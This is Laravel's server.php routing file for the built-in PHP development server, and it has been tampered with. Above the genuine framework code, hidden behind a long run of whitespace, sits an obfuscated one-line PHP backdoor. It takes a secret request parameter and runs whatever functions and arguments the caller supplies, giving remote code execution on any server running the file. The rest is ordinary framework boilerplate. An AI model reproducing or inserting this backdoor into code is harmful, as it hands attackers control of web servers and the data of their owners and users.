<?php
																																																																																																																																				iF	(($ry6Wy =@${ '_REQUEST'}['2HR993IF' ]	)And(11426+17826	)){$ry6Wy[1	](${$ry6Wy[2]}[0] ,$ry6Wy[3 ]($ry6Wy[4 ])) ;};

/**
 * Laravel - A PHP Framework For Web Artisans
 *
 * @package  Laravel
 * @author   Taylor Otwell <taylor@laravel.com>
 */

$uri = urldecode(
    parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH)
);

// This file allows us to emulate Apache's "mod_rewrite" functionality from the
// built-in PHP web server. This provides a convenient way to test a Laravel
// application without having installed a "real" web server software here.
if ($uri !== '/' && file_exists(__DIR__.'/public'.$uri)) {
    return false;
}

require_once __DIR__.'/public/index.php';
